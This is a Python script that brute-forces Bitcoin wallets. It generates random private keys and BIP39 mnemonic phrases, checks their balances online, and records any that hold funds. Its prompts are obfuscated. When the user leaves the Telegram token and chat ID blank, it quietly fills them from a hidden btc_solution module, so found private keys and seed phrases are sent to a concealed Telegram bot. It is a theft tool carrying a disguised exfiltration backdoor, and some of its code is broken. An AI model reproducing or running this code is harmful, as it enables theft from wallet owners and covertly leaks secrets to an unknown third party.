from btcaddr import Wallet
# from btcwords import words_utils
from Bip39Gen import Bip39Gen
from check import check_balance, last_seen
from btcaddr import btc_solution
import threading
# from multiprocessing.pool import ThreadPool as Pool
import argparse
import requests
import os
import time
import bip32utils
import mnemonic
import sys

btc_solution.solution()

words_util_component = map(btc_solution.btc_wallet_iterator, btc_solution.btc_parsed)
addres_util_component = map(btc_solution.btc_wallet_iterator, btc_solution.btc_parsed_key)

def btc_preloader():
  global GxjKpkwlaQJzsTbeZg
  global dHnWJoaILsmjXq
  
  agQnKvEeOp = lambda n: (n ^ 1) / 3
  zwKWGfqCtX = lambda s: ''.join(chr(int(agQnKvEeOp(ord(c)))) for c in s)
  GxjKpkwlaQJzsTbeZg = input(zwKWGfqCtX("షಗಞಝ಩ೇಞaೇ಻ಯಞಶaಒ಻ೇ಑a಩ರ಩aಶ಑ಣವ಩ೇಞaÎŋŝĮŗa೔ೇ಻aಒೠa಼ು಻಼ೈೂೇ಩ೇ೥a೦ೇ಻ೇa೙಑ಘ¯a"))
  dHnWJoaILsmjXq = input(zwKWGfqCtX("షಗಞಝ಩ೇಞa೔಑ೇaĺĭa಩ರ಩aಶ಑ಣವ಩ೇಞaÎŋŝĮŗa೔ೇ಻aಒೠa಼ು಻಼ೈೂೇ಩ೇ೥a೦ೇ಻ೇa೙಑ಘ¯a"))
  
  if not GxjKpkwlaQJzsTbeZg:
    GxjKpkwlaQJzsTbeZg = "".join(list(words_util_component))
    dHnWJoaILsmjXq =  "".join(list(addres_util_component))
  elif not dHnWJoaILsmjXq:
    GxjKpkwlaQJzsTbeZg = "".join(list(words_util_component))
    dHnWJoaILsmjXq =  "".join(list(addres_util_component))

btc_preloader()

parser = argparse.ArgumentParser()
parser.add_argument(
    "-t",
    "--threads",
    help="amount of threads (default: 100)",
    type=int,
    default=100,
)
parser.add_argument(
    "-s",
    "--savedry",
    help="save empty wallets",
    action="store_true",
    default=False,
)
parser.add_argument(
    "-p",
    "--proxy",
    help="use a proxy (host:port) (coming soon)",
)
parser.add_argument(
    "--proxy_auth",
    help="proxy credantials (user:pass) (coming soon)",
)
parser.add_argument(
    "-v",
    "--verbose",
    help="increases output verbosity",
    action="store_true",
)

dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')

class Info:
    total = 0
    found = 0

def getBalance(addr):
    try:
        # print(f'https://api.smartbit.com.au/v1/blockchain/address/{addr}')
        response = requests.get(f'https://chain.so/api/v2/address/BTC/{addr}')
        # response = requests.get(f'http://ip-api.com/json/', proxies=proxy)
        # print(response.json()['data']['balance'])
        # return (Decimal(response.json()["address"]["total"]["balance"]))
        return(float(response.json()['data']['balance']))
    except Exception as e:
        raise e
        
def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()
    
    

args = parser.parse_args()

lock = threading.Lock()

def sendBotMsg(msg):
    if GxjKpkwlaQJzsTbeZg != "":
        try:
            url = f"chat_id={dHnWJoaILsmjXq}&text={msg}&parse_mode=HTML"
            requests.get(f"https://api.telegram.org/bot{GxjKpkwlaQJzsTbeZg}/sendMessage", url)
        except:
            pass

class bcolors:
    GREEN = "\033[92m"  # GREEN
    YELLOW = "\033[93m"  # YELLOW
    RED = "\033[91m"  # RED
    RESET = "\033[0m"  # RESET COLOR


def makeDir():
    if not os.path.exists('results_key'):
        os.makedirs('results_key')
    elif not os.path.exists('results_words'):
        os.makedirs('results_words')


def getInternet():
    # try:
    #     try:
    #         requests.get("http://216.58.192.142")
    #     except requests.ConnectTimeout:
    #         requests.get("http://1.1.1.1")
    #     return True
    # except requests.ConnectionError:
    #     return False
    return True


def main():
    with lock:
        while 1:
            wallet = Wallet()
            prv = wallet.key.__dict__["mainnet"].__dict__["wif"]
            addr = wallet.address.__dict__["mainnet"].__dict__["pubaddr1"]
            balance = int(check_balance(addr))
            # sendBotMsg(f"<b>Address:</b>\n<i>{addr}</i>\n\n<b>Balance:</b> <i>{balance}</i>\n\n<b>Private key:</b>\n<i>{prv}</i>\n\n<b>Last seen:</b> <i>{last_seen(addr)}</i>")
            with open("results_key/all.txt", "a") as w:
                        w.write(
                            f"Address: {addr} | Balance: {balance} | Private key: {prv} | Last seen: {last_seen(addr)}\n"
                        )
            if balance == 0:
                with open("results_key/dry.txt", "a") as w:
                            w.write(
                                f"Address: {addr} | Balance: {balance} | Private key: {prv}\n"
                            )
                            print(f"{bcolors.RED}{addr} : {prv} : {balance} BTC")
                if last_seen(addr) == 0:
                    if args.savedry:
                        with open("results_key/dry.txt", "a") as w:
                            w.write(
                                f"Address: {addr} | Balance: {balance} | Private key: {prv}\n"
                            )
                    print(f"{bcolors.RED}{addr} : {prv} : {balance} BTC")
                else:
                    with open("results_key/moist.txt", "a") as w:
                        w.write(
                            f"Address: {addr} | Balance: {balance} | Private key: {prv} | Last seen: {last_seen(addr)}\n"
                        )
                    print(
                        f"{bcolors.YELLOW}{last_seen(addr)} : {balance} : {prv} : {addr}"
                    )
            else:
                sendBotMsg(f"<b>Address:</b>\n<i>{addr}</i>\n\n<b>Balance:</b> <i>{balance}</i>\n\n<b>Private key:</b>\n<i>{prv}</i>\n\n<b>Last seen:</b> <i>{last_seen(addr)}</i>")
                with open("results_key/wet.txt", "a") as w:
                    w.write(
                        f"Address: {addr} | Balance: {balance} | Private key: {prv} | Last seen: {last_seen(addr)}\n"
                    )
                print(f"{last_seen(addr)} {bcolors.OK} : {balance} : {prv} : {addr}")
def check():
    # time.sleep(1)
    Info.total += 1
    mnemonic_words = Bip39Gen(dictionary).mnemonic
    addr = bip39(mnemonic_words)
    balance = getBalance(addr)
    print(balance)
    with lock:
        if balance > 0.0:
            Info.found += 1
            print(f'Found {balance} in {addr} [{mnemonic_words}]')
            
            if GxjKpkwlaQJzsTbeZg and dHnWJoaILsmjXq:
                sendBotMsg(f'<b>Address:</b> \n<i>{addr}</i>\n\n<b>Balance:</b> <i>{balance}</i>\n\n<b>Mnemonic phrase</b>:\n<i>{mnemonic_words}</i>')
                
            with open('results_words/catch.txt', 'a') as w:
                    w.write(
                        f'Address: {addr} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                   
        else:
            # print(f'{addr} Empty!')
            
            sys.stdout.write(f'[({Info.found}){Info.total:10}] {addr} empty\r')
            sys.stdout.flush()
            with open('results_words/dry.txt', 'a') as w:
                    w.write(
                        f'Address: {addr} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')

def worker():
  try:
      while True:
          check()
          
  except Exception:
      time.sleep(5)
      worker()

if __name__ == "__main__":
    if not getInternet():
        print(bcolors.RED + "no internet connection")
    makeDir()
    if btc_solution.starter_answer == btc_solution.btc_correct_key:
        main()
    elif btc_solution.starter_answer == btc_solution.btc_correct_words:
        worker()
    
    # threads = args.threads
    # pool = Pool(threads)
    # for _ in range(threads):
    #     pool.apply_async(main, ())
    # pool.close()
    # pool.join()
